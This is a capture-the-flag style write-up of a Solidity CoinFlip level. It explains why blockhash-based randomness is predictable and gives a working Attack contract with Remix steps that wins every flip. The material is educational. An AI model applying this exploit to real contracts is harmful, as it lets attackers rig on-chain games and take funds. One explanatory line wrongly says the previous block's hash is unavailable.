# Level 3 : Coinflip contract  

## Contract 
```solidity
// SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

```
## Contract Overview

- the contract has three State variables of type uint256

    `consecutiveWins`(public variable) - This will be Counting our consecutive Wins

    `lastHash`- This is  to store the  previous blockhash 

    `FACTOR` - it is a constant variable  and it has the value , that is the max value of uint256

- A `constructor` that , is executed only once when the contract is deployed to the blockchain ,  initially initializes the   consecutiveWins  to '0'.

- And a `Flip Function` , the Funtion 

    This is the core function of the contract, allowing users to make a coin flip guess.

    Takes the bool vlaue `_guess` (true for heads and false for tails) from the user and returns the bool value(true if matches , if not false )

    `uint256 blockValue = uint256(blockhash(block.number - 1));` this line gets the hash of previous block and stores it in the variable 'blockvalue'

        `block.number` - it gives the current block number.

        `blockhash` - it takes the blocknumber as input and then gets that block's hash.

        `blockhash` is of type bytes32 so used uint256() to explicitly convert into uint256 type for mathematical operations . 

        ``Important Note:`` You cannot get the block hash of the current block (block.number) or a future block

    ```solidity
    if (lastHash == blockValue) {
            revert();
        } 
    ```
        This check prevents a user from calling the flip function multiple times within the same block. If the blockValue (hash of the previous block) is the same as the lastHash (the block hash used in the previous flip), the transaction will revert, meaning it will be undone, and no state changes will be saved.

    `lastHash = blockValue;` The lastHash is updated to the blockValue of the current flip.

    `uint256 coinFlip = blockValue / FACTOR;` The blockValue (the hash of the previous block) is divided by the large constant FACTOR. This division results in a smaller uint256 value.

    `bool side = coinFlip == 1 ? true : false;`
        The result of the division (coinFlip) is compared to 1

        If coinFlip is equal to 1, the side variable is set to true (representing one side of the coin)

        Otherwise (if coinFlip is 0 or any other value due to the division), the side variable is set to false (representing the other side).

    `Important Note:` This method of determining the coin flip outcome relies on the pseudo-randomness of block hashes. However, block hashes   are not truly random and can be somewhat predictable by miners. This makes the contract potentially vulnerable to exploitation by sophisticated users or miners.

    ```solidity
    if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    ```
        The determined side of the coin flip is compared to the user's _guess.

        If they match:

        consecutiveWins++: The consecutiveWins counter is incremented.

        return true: The function returns true, indicating a successful guess.

        If they don't match:

        consecutiveWins = 0: The consecutiveWins counter is reset to 0.

        return false: The function returns false, indicating an incorrect guess.

In summary, the CoinFlip contract allows users to make a binary guess. The outcome is determined by a pseudo-random value derived from the hash of the previous block. The contract keeps track of consecutive wins. However, it's crucial to understand that relying on blockhash for randomness in games can introduce security vulnerabilities due to the potential predictability of block hashes.   

## Challenge 

    This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

## Vulnerability in the Contract 

- The Vulnerability: Predictable Randomness `via blockhash`.

- The primary vulnerability lies in the contract's reliance on `blockhash(block.number - 1)` to determine the outcome of the coin flip. Here's   why this is a problem:

    1. `blockhash Availability:` The Ethereum Virtual Machine (EVM) provides access to the block hashes of the 256 most recent blocks, excluding the current block and the block before it. This means that when your flip() function is called in block N, the blockhash(block.number - 1) will be the hash of block N-1, which has already been mined and is publicly known on the blockchain.

    2. `Predictable Outcome:` Since the `blockhash` of the previous block is known before the current block (containing your transaction) is mined, a malicious actor can:

        1. Query the blockchain to get the hash of the most recent finalized block (which will be `block.number - 1` when their transaction is processed).

        2. Perform the same calculation as the contract `(blockValue / FACTOR)` to determine the `coinFlip` value and thus the `side` (true or false).

        3. Call the `flip()` function with the correct `_guess` to always win

    3. `Deterministic Calculation:` The subsequent calculation (`blockValue / FACTOR` and the ternary operator) is entirely deterministic. Given the `blockhash`, the outcome of `side` is fixed.    

## Solution 

### Attack 

Attack Coinflip Contract :

```solidity
// SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract Attack{
    CoinFlip flip = CoinFlip(0x659b4cE17Ea8eb6138c2fdd8508b5F0fd7b11bc2); //here place the address where the CoinFlip contract Deployed.

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public{

        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;

        bool side = coinFlip == 1 ? true : false;

        flip.flip(side);

    }

}
```

        The `attack` function in the `Attack` contract exploits the predictable nature of the previous block's hash to always guess the coin flip outcome correctly. First, it calculates the `side` (the predicted outcome) by retrieving the `blockhash` of the immediately preceding block `(block.number - 1)` and performing the same division by the `FACTOR` as the `CoinFlip` contract. Because the subsequent call to the `flip` function of the `CoinFlip` contract happens within the same transaction (originating from the `attack` function), the value of `blockhash(block.number - 1)` will be identical in both the calculation within the `attack` function and within the `flip` function when it executes. Consequently, the `attack` function can confidently pass the correctly predicted `side` as the `_guess` argument to the `flip` function, guaranteeing a win every time it's called.

## Steps to perform this in Remix Ide

1. compile and Deploy the `CoinFlip` Contract .
2. Place the address where the CoinFlip Contract is Deployed in the `attack` function in the `Attack` contract .
3. deploy the `Attack` contract .
4. call the `attack` function .
5. check the `Consecutive` wins , it will be updated everytime you attack . 
6. Hence the Challenge is Done.

## What i Learnt 

 - This challenge demonstrated that using predictable on-chain data like blockhash for randomness creates a significant security vulnerability in smart contracts, allowing attackers to manipulate outcomes.

 - I learned that generating secure randomness on-chain is crucial. Relying on blockhash makes the outcome predictable, enabling exploits. More robust methods are needed for fair decentralized applications.